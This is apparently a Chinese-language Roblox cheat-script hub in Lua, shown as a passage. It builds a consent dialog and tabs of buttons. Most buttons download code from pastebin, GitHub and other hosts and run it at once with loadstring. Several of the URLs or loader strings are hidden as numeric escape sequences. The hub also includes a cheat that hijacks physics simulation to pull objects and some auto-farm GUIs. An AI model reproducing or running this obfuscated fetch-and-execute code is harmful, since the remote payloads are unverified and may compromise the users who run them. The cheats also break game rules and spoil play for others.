    disagreeButton.Position = UDim2.new(0, 0.1 * frame.Size.X.Offset, 0,
        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
    disagreeButton.BackgroundTransparency = 0
    disagreeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    disagreeButton.Text = "不同意"
    disagreeButton.TextColor3 = Color3.new(255, 0, 0)
    disagreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
    disagreeButton.Font = Enum.Font.SourceSans
    disagreeButton.Parent = frame
    local disagreeCorner = Instance.new("UICorner")
    disagreeCorner.CornerRadius = UDim.new(0, 10)
    disagreeCorner.Parent = disagreeButton

    local agreeButton = Instance.new("TextButton")
    agreeButton.Name = "AgreeButton"
    agreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
    agreeButton.Position = UDim2.new(0, frame.Size.X.Offset - 0.5 * frame.Size.X.Offset, 0,
        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
    agreeButton.BackgroundTransparency = 0
    agreeButton.BackgroundColor3 = Color3.fromRGB(106, 159, 255)
    agreeButton.Text = "同意"
    agreeButton.TextColor3 = Color3.new(255, 255, 255)
    agreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
    agreeButton.Font = Enum.Font.SourceSans 
    agreeButton.Parent = frame

    
    local agreeFrame = Instance.new("TextLabel")
    agreeFrame.Size = UDim2.new(0.8, 0, 0.5, 0)
    agreeFrame.Position = UDim2.new(0.1, 0, 0.22, 0)
    agreeFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    agreeFrame.Text = "1.枕头温馨提示.\n 2.这个脚本可能加载错误.\n 3.加载错误别怪我."
    agreeFrame.TextWrapped = true

    
    agreeFrame.TextSize = 16  


    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = agreeFrame

    agreeFrame.Parent = frame

    local agreeCorner = Instance.new("UICorner")
    agreeCorner.CornerRadius = UDim.new(0, 10)
    agreeCorner.Parent = agreeButton
    local minimizeButton = Instance.new("TextButton")
    minimizeButton.Name = "MinimizeButton"
    minimizeButton.Size = UDim2.new(0, 40, 0, 40)
    minimizeButton.Position = UDim2.new(1, -65, 0, 10)
    minimizeButton.BackgroundTransparency = 0
    minimizeButton.BackgroundColor3 = Color3.fromRGB(199, 199, 199)
    minimizeButton.Text = "-"
    minimizeButton.TextSize = 28  
    minimizeButton.TextColor3 = Color3.new(0, 0, 0)
    minimizeButton.Font = Enum.Font.SourceSans
    minimizeButton.Parent = frame

    local isMinimized = false

    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 5)
    minimizeCorner.Parent = minimizeButton

    minimizeButton.MouseButton1Click:Connect(function()
        if isMinimized then
            frame.Size = UDim2.new(0, 500, 0, 280)
            titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
            minimizeButton.Text = "-"
            minimizeButton.TextSize = 28
            isMinimized = false
            disagreeButton.Visible = true
            agreeButton.Visible = true
            agreeFrame.Visible = true
        else
            frame.Size = UDim2.new(0, 500, 0, 60)
            titleLabel.Position = UDim2.new(0, 0, 0, 0)
            minimizeButton.Text = "+"
            minimizeButton.TextSize = 28 
            isMinimized = true
            disagreeButton.Visible = false
            agreeButton.Visible = false
            agreeFrame.Visible = false
        end
    end)

    local function AnimateExit()
        local duration = 1
        local startTime = tick()
        local initialSize = frame.Size
        while (tick() - startTime) < duration do
            local elapsedTime = tick() - startTime
            local scale = 1 - elapsedTime / duration
            frame.Size = UDim2.new(initialSize.X.Scale * scale, initialSize.X.Offset * scale,
                initialSize.Y.Scale * scale, initialSize.Y.Offset * scale)
            frame.Position = frame.Position + UDim2.new((1 - scale) / 2, 0, (1 - scale) / 2, 0)
            wait()
        end
        gui:Destroy()
    end
    disagreeButton.MouseButton1Click:Connect(function()
        AnimateExit()
    end)
    agreeButton.MouseButton1Click:Connect(function()
        AnimateExit()
getgenv().XC="作者XC"loadstring(game:HttpGet("https://pastebin.com/raw/PAFzYx0F"))()
    end)
end
local myTitle = "注意" 
CreateGUI(myTitle)
end
})
Tab:AddButton({
	Name = "北极脚本",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/KwARpDxV",true))()
end
})
Tab:AddButton({
	Name = "情云脚本",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CNqingyun/-/main/%E6%83%85%E4%BA%91.lua"))()
end
})
Tab:AddButton({
	Name = "小凌beta",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/flyspeed7/Execute-Beta/main/%E5%B0%8F%E5%87%8C%E8%84%9A%E6%9C%AC.LUA"))()
end
})
Tab:AddButton({
	Name = "空调本",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BINjiaobzx6/BINjiao/main/%E7%A9%BA%E8%84%9A%E6%9C%ACV1.0.1.txt"))()
end
})
Tab:AddButton({
	Name = "这个脚本和上面脚本的作者一样",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\66\73\78\46\108\117\97\34\41\41\40\41\10")
end
})
Tab:AddButton({
	Name = "bin脚本中心",
	Callback = function()
local library = loadstring(game:HttpGet("https://pastebin.com/raw/nBq2D86q"))()
local window = library:new("")

local creds = window:Tab("信息",'16060333448')

local bin = creds:section("玩家信息",true)

    bin:Label("你的用户名:"..game.Players.LocalPlayer.Character.Name)
    bin:Label("你的注入器:"..identifyexecutor())
    
    local bin = creds:section("作者信息",true)
    bin:Label("官群:765916538")
    bin:Label("作者:bin")
    bin:Label("所有脚本完全免费")
    bin:Label("不要拿去卖")
    bin:Label("有bug才会更新")
    
local credits = creds:section("关闭",true)

credits:Toggle("脚本框架变小一点", "", false, function(state)
        if state then
        game:GetService("CoreGui")["frosty"].Main.Style = "DropShadow"
        else
            game:GetService("CoreGui")["frosty"].Main.Style = "Custom"
        end
    end)
    credits:Button("关闭脚本",function()
        game:GetService("CoreGui")["frosty"]:Destroy()
    end)
local creds = window:Tab("通用",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("飞行",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gqv7PXAa"))()
end)

    credits:Button("人物旋转",function()
    loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
end)

    credits:Button("修改攻击体积",function()
    loadstring(game:HttpGet("https://shz.al/CpRJ"))()
end)

    credits:Button("光影V4",function()
    loadstring(game:HttpGet("https://shz.al/aMka"))()
end)

local creds = window:Tab("背上只因剑",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("背上只因剑",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0SwordWarriors"))()
end)

local creds = window:Tab("doors",'16060333448')

local credits = creds:section("doors",true)
    credits:Button("最强",function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
end)

    credits:Button("doors极端",function()
    loadstring(game:HttpGet('https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true'))()
end)

    credits:Button("doors通用",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()
end)

    credits:Button("doors变形",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
end)

    credits:Button("牛b功能",function()
    loadstring("\112\114\105\110\116\40\34\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\73\78\71\72\85\66\48\49\47\66\108\97\99\107\75\105\110\103\47\109\97\105\110\47\66\108\97\99\107\75\105\110\103\37\50\48\68\111\111\114\115\37\50\48\77\111\98\105\108\101\34\41\41\40\41\32\34\41\10")()
end)

    credits:Button("自动过rooms",function()
    loadstring(game:HttpGet('\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x2E\x6C\x6B\x6D\x63\x2E\x61\x73\x69\x61\x2F\x73\x63\x72\x69\x70\x74\x2F\x64\x6F\x6F\x72\x73\x72\x6F\x6F\x6D\x2E\x6C\x75\x61'))()
end)

    credits:Button("doors4",function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.lua"),true))()
end)

    credits:Button("doors5",function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
end)

    credits:Button("doors6",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua'),true))()
end)

local creds = window:Tab("力量传奇",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("力量传奇",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
end)

local creds = window:Tab("刀刃球",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("刀刃1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/daorenqiu"))()
end)

    credits:Button("刀刃2",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
end)

    credits:Button("刀刃自动格挡",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
end)

local creds = window:Tab("监狱人生",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("监狱吊打一切",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
end)

    credits:Button("监狱人生2",function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/i1nfinity/Project-X/master/Prison%20Breaker%20X"), true))()
end)

local creds = window:Tab("彩虹朋友",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("彩虹朋友1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Rainbow-Friends/main/Rainbow%20Friends"))()
end)

    credits:Button("彩虹朋友2",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/' .. game.GameId .. ".lua"))(' Watermelon ? ')
end)

local creds = window:Tab("俄州",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("俄州1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/Ohio.lua", true))()
end)

    credits:Button("俄州2",function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\99\114\105\112\116\115\46\118\105\115\117\114\117\115\46\100\101\118\47\111\104\105\111\47\115\111\117\114\99\101"))()
end)

    credits:Button("俄州3",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou"))()
end)

    credits:Button("俄州指令脚本",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/longshulol/long/main/longshu/Ohio"))()
end)

local creds = window:Tab("动感星期五",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("动感星期五1",function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-script-delta-and-fluxus-7093"))()
end)

local creds = window:Tab("一路向西",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("一路向西1",function()
    loadstring(game:GetObjects("rbxassetid://10040701935")[1].Source)()
end)

    credits:Button("一路向西2",function()
    loadstring(game:GetObjects("rbxassetid://10040722920")[1].Source)()
end)

    credits:Button("一路向西3",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/linnblin/linnb/main/linnb"))()
end)

local creds = window:Tab("小偷模拟器",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("小偷模拟器",function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/adrician/Thief-Simulator---GUI/main/Thief%20sim.lua"),true))()
end)

local creds = window:Tab("bf",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("bf汉化",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.lua", true))()
end)

    credits:Button("bf2",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
end)

local creds = window:Tab("忍者大亨",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("刷钱",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AliCode14/scripts/main/ScriptHub.lua"))()
end)

local creds = window:Tab("造船寻宝",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("造船寻宝1",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
end)

local creds = window:Tab("迅速传奇",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("迅速传奇1",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/cwCdNqds"))()
end)

local creds = window:Tab("最强战场",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("最强战场1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/SaitamaBattlegrounds.lua"))()
end)

local creds = window:Tab("鲨口求生",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("鲨口求生",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/YYVLbzVg", true))()
end)

local creds = window:Tab("战争大亨",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("战争大亨",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/War-Tycoon/main/Script"))()
end)

local creds = window:Tab("伐木大亨",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("伐木大亨1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
end)

local creds = window:Tab("兵工厂",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("兵工厂",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
end)

local creds = window:Tab("自然灾害",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("自然灾害",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/MrWitzbold/Natural-disaster-survival-GUI/main/main.lua'),true))()
end)

local creds = window:Tab("奇怪严格的办法",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("奇怪严格的爸爸",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yBloodz/Free-scripts/main/Weird%20Strict%20Dad"))()
end)

local creds = window:Tab("基本上都是FNF",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("FNF",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/BasicallyFNF", true))()
end)

local creds = window:Tab("其他脚本中心",'16060333448')

local credits = creds:section("内容",true)
    credits:Button("脚本中心",function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
end)

    credits:Button("剑客",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/jiankeQWQ/Sword-Guest/main/JKYYDS')))()
end)

    credits:Button("导管中心",function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
end)

    credits:Button("狗蛋脚本V2",function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\121\97\110\103\119\112\46\99\110\47\97\112\105\47\118\51\47\102\105\108\101\47\103\101\116\47\57\57\54\52\47\37\69\53\37\56\68\37\65\49\37\69\53\37\65\70\37\56\54\37\69\55\37\66\51\37\66\66\37\69\55\37\66\66\37\57\70\37\69\53\37\56\65\37\65\48\37\69\53\37\65\70\37\56\54\37\69\53\37\57\48\37\56\69\37\69\55\37\57\65\37\56\52\37\69\57\37\57\51\37\66\69\37\69\54\37\56\69\37\65\53\48\50\46\116\120\116\63\115\105\103\110\61\85\108\101\66\108\99\51\87\80\95\112\77\84\56\117\108\89\122\45\56\89\106\117\114\71\90\48\87\88\56\113\102\88\68\105\104\116\51\113\71\100\97\107\37\51\68\37\51\65\48\34\44\116\114\117\101\41\41\40\41\10")()
end)

    credits:Button("杯脚本",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zuohongjian/bjb/main/true"))()
end)

    credits:Button("地岩脚本",function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\98\97\109\120\98\98\97\109\120\98\98\97\109\120\47\99\111\100\101\115\112\97\99\101\115\45\98\108\97\110\107\47\109\97\105\110\47\37\69\55\37\57\57\37\66\68\34\41\41\40\41")()
end)

    credits:Button("黑子脚本",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/mnMaZwBQ"))()
end)

    credits:Button("鹰眼v1",function()
    loadstring(game:HttpGet("https://shz.al/~eyyingyan"))()
end)

    credits:Button("皇脚本",function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
end)

    credits:Button("林脚本",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/linnblin/linnb/main/linnb"))()
end)

    credits:Button("刺客V2",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/WDQi/SF/main/%E7%9C%8B%E4%BD%A0M.txt')))()
end)
end
})    
Tab:AddButton({
	Name = "好像是脚本中心(忘了)",
	Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
end
})
Tab:AddButton({
	Name = "导管",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
end
})
Tab:AddButton({
	Name = "小星V4",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\115\104\122\46\97\108\47\107\77\70\116\34\41\41\40\41\10")()
end
})
Tab:AddButton({
	Name = "绿",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/Esw6YQKR"))()
end
})
Tab:AddButton({
	Name = "云",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Cloud-script/main/2024-2-9%20Cloud%20script.lua", true))()
end
})
Tab:AddButton({
	Name = "达(免费)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/133ufudhdu/fabdsj/main/be%20free%20of%20charge"))()
end
})
Tab:AddButton({
	Name = "达(好像要钱)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/133ufudhdu/XGJKWQU/main/XGQJKWQU"))()
end
})
Tab:AddButton({
	Name = "退休",
	Callback = function()
TUIXUI="作者退休☯︎"JIAOBEN="永久免费缝合"qun="809771141"loadstring(game:HttpGet("https://pastebin.com/raw/yPhwFHy4"))()
end
})
Tab:AddButton({
	Name = "nn",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\100\104\100\98\120\117\98\47\110\110\115\105\101\106\119\47\109\97\105\110\47\71\85\73\89\68\83\83\46\108\117\97\34\41\41\40\41\10")()
end
})
Tab:AddButton({
	Name = "秋月合集",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\65\50\107\80\80\113\118\98\34\41\41\40\41\10")()
end
})
local Tab = Window:MakeTab({
    Name = "自然灾害",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "黑洞脚本(需要按e)",
	Callback = function()
local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local NetworkAccess = coroutine.create(function()
    settings().Physics.AllowSleep = false
    while game:GetService("RunService").RenderStepped:Wait() do
        for _, Players in next, game:GetService("Players"):GetPlayers() do
            if Players ~= game:GetService("Players").LocalPlayer then
                Players.MaximumSimulationRadius = 0 
                sethiddenproperty(Players, "SimulationRadius", 0) 
            end 
        end
        game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
        setsimulationradius(math.huge) 
    end 
end) 
coroutine.resume(NetworkAccess)
local function ForcePart(v)
    if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2 
        AlignPosition.Attachment1 = Attachment1
    end
end
for _, v in next, game:GetService("Workspace"):GetDescendants() do
    ForcePart(v)
end
game:GetService("Workspace").DescendantAdded:Connect(function(v)
    ForcePart(v)
end)
UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)
spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Updated
    end
end)
end
})
local Tab = Window:MakeTab({
    Name = "力量传奇",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "击飞(无视任何)",
	Callback = function()
loadstring(game:GetObjects("rbxassetid://10123407012")[1].Source)()
end
})
Tab:AddButton({
	Name = "ato",
	Callback = function()
-- rush BS2
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local unequip = Instance.new("TextButton")
local weapon = Instance.new("TextBox")
local StopFarming = Instance.new("TextButton")
local Farm = Instance.new("TextButton")
local equip = Instance.new("TextButton")
local DiaPop = Instance.new("TextButton")
local yes = Instance.new("TextLabel")
local Open = Instance.new("TextButton")
local Close = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "主要的"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.Position = UDim2.new(0.136212632, 0, 0.165016502, 0)
Main.Size = UDim2.new(0, 657, 0, 432)
Main.Visible = false
Main.Active = true
Main.Draggable = true

unequip.Name = "不装备"
unequip.Parent = Main
unequip.BackgroundColor3 = Color3.fromRGB(153, 1, 1)
unequip.Position = UDim2.new(0.0608827993, 0, 0.595135629, 0)
unequip.Size = UDim2.new(0, 585, 0, 77)
unequip.Font = Enum.Font.SourceSans
unequip.Text = "取消装备"
unequip.TextColor3 = Color3.fromRGB(0, 0, 0)
unequip.TextScaled = true
unequip.TextSize = 14.000
unequip.TextWrapped = true
unequip.Visible = false
unequip.MouseButton1Click:connect(function()
	equip.Visible = true
	unequip.Visible = false
	_G.equip = false
end)

weapon.Name = "武器"
weapon.Parent = Main
weapon.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
weapon.Position = UDim2.new(0.068, 0, 0.184, 0)
weapon.Size = UDim2.new(0, 576, 0, 74)
weapon.Font = Enum.Font.SourceSans
weapon.Text = "武器名称在这里"
weapon.TextColor3 = Color3.fromRGB(0, 0, 0)
weapon.TextScaled = true
weapon.TextSize = 14.000
weapon.TextWrapped = true

StopFarming.Name = "停止锻炼"
StopFarming.Parent = Main
StopFarming.BackgroundColor3 = Color3.fromRGB(153, 1, 1)
StopFarming.Position = UDim2.new(0.0608827993, 0, 0.395539939, 0)
StopFarming.Size = UDim2.new(0, 585, 0, 77)
StopFarming.Font = Enum.Font.SourceSans
StopFarming.Text = "停止锻炼"
StopFarming.TextColor3 = Color3.fromRGB(0, 0, 0)
StopFarming.TextScaled = true
StopFarming.TextSize = 14.000
StopFarming.TextWrapped = true
StopFarming.Visible = false
StopFarming.MouseButton1Click:connect(function()
	Farm.Visible = true
	StopFarming.Visible = false
	_G.farm = false
end)

Farm.Name = "锻炼"
Farm.Parent = Main
Farm.BackgroundColor3 = Color3.fromRGB(153, 1, 1)
Farm.Position = UDim2.new(0.0608827993, 0, 0.395539939, 0)
Farm.Size = UDim2.new(0, 585, 0, 77)
Farm.Font = Enum.Font.SourceSans
Farm.Text = "锻炼"
Farm.TextColor3 = Color3.fromRGB(0, 0, 0)
Farm.TextScaled = true
Farm.TextSize = 14.000
Farm.TextWrapped = true
Farm.MouseButton1Click:connect(function()
	StopFarming.Visible = true
	Farm.Visible = false
	_G.farm = true
	while _G.farm do
		wait()
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == weapon.Text then v:Activate() end
		end
	end
end)

equip.Name = "装备"
equip.Parent = Main
equip.BackgroundColor3 = Color3.fromRGB(153, 1, 1)
equip.Position = UDim2.new(0.0608827993, 0, 0.595135629, 0)
equip.Size = UDim2.new(0, 585, 0, 77)
equip.Font = Enum.Font.SourceSans
equip.Text = "装备"
equip.TextColor3 = Color3.fromRGB(0, 0, 0)
equip.TextScaled = true
equip.TextSize = 14.000
equip.TextWrapped = true
equip.Visible = true
equip.MouseButton1Click:connect(function()
unequip.Visible = true
equip.Visible = false
_G.equip = true
while _G.equip do
	wait()
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
	if v.Name == weapon.Text then
		v.Parent = game.Players.LocalPlayer.Character
	end
	end
	end
end)

DiaPop.Name = "迪亚波普"
DiaPop.Parent = Main
DiaPop.BackgroundColor3 = Color3.fromRGB(153, 1, 1)
DiaPop.Position = UDim2.new(0.055, 0, 0.794, 0) 
DiaPop.Size = UDim2.new(0, 589, 0, 77)
DiaPop.Font = Enum.Font.SourceSans
DiaPop.Text = "禁用弹出窗口"
DiaPop.TextColor3 = Color3.fromRGB(0, 0, 0)
DiaPop.TextScaled = true
DiaPop.TextSize = 14.000
DiaPop.TextWrapped = true
DiaPop.MouseButton1Click:connect(function()
	game:GetService("Players").LocalPlayer.PlayerGui.HUD.Frame.MuscleGain:Destroy()
end)

yes.Name = "好的"
yes.Parent = Main
yes.BackgroundColor3 = Color3.fromRGB(63, 0, 0)
yes.Position = UDim2.new(-0.00077368319, 0, -0.00165016949, 0)
yes.Size = UDim2.new(0, 657, 0, 71)
yes.Font = Enum.Font.SourceSans
yes.Text = "汉化作者ato"
yes.TextColor3 = Color3.fromRGB(255, 255, 255)
yes.TextScaled = true
yes.TextSize = 15.000
yes.TextWrapped = true

Open.Name = "打开"
Open.Parent = ScreenGui
Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Open.ClipsDescendants = true
Open.Position = UDim2.new(0.900332212, 0, 0.490122855, 0)
Open.Size = UDim2.new(0, 90, 0, 40)
Open.Font = Enum.Font.SourceSans
Open.Text = "打开"
